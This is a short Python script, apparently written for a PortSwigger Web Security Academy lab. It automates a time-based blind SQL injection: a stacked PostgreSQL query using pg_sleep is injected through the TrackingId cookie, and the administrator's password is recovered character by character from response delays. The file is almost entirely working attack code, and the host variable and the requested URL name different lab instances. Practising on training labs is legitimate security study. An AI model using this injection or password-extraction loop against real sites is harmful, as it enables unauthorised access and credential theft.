import requests
import string

# Request Params:

host = "0add00ef041ef6ce8035a98600c00047.web-security-academy.net"
url = F"https://{host}/filter"
trackingId ="FV1TanKwqLFHEpDX"
session = 'vzmsExc9JpX8YBKIEuDr9dlVOrl2lYwV'

cookies = {
    'TrackingId': F"{trackingId}'%3bSELECT%20CASE%20WHEN%20(username%3d'administrator'%20AND%20SUBSTRING(password%2c1%2c1)%3d'a')%20THEN%20pg_sleep(2)%20ELSE%20pg_sleep(0)%20END%20FROM%20users--",
    'session': session,
}

headers = {
    'Host': F"{host}",
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    # Requests doesn't support trailers
    # 'Te': 'trailers',
    # 'Cookie': "TrackingId=sNg4KmagaG8A1IQW'%3bSELECT%20CASE%20WHEN%20(username%3d'administrator'%20AND%20SUBSTRING(password%2c1%2c1)%3d'a')%20THEN%20pg_sleep(2)%20ELSE%20pg_sleep(0)%20END%20FROM%20users--; session=xjmVBBwjL8kiitabFl3zkgjy4f5oicSD",
}

# Intruder code:

c_table = string.ascii_lowercase + string.digits
current = ""
password = ""

for i in range (1,21):
  
  for c in c_table:
    t = F"{trackingId}'%3bSELECT%20CASE%20WHEN%20(username%3d'administrator'%20AND%20SUBSTRING(password%2c1%2c{i})%3d'{current+c}')%20THEN%20pg_sleep(2)%20ELSE%20pg_sleep(0)%20END%20FROM%20users--"
    cookies['TrackingId']=t
    response = requests.get(
      'https://0a420073037936b180934ee600420080.web-security-academy.net/',
      cookies=cookies,
      headers=headers,
      verify=False,
    )

    if (response.elapsed.total_seconds() > 2):
      current+=c
      print(current)
      break

  if (password==current):
    print("PASSWORD: ",password)
    break
  else:
    password = current
